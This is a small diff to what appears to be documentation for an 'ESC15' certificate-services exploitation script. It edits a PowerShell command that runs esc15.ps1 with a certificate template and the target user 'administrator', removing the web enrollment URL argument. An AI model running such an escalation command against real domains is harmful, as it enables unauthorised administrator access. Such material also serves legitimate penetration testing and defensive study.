@@ -124,8 +124,7 @@ cd ESC15
 
 # Run the exploitation script
 .
-\esc15.ps1 -webURL "http://ca-server/certsrv" `
-            -templateName "WebEnrollTemplate" `
+\esc15.ps1 -templateName "WebEnrollTemplate" `
             -targetUser "administrator"
 ```
 
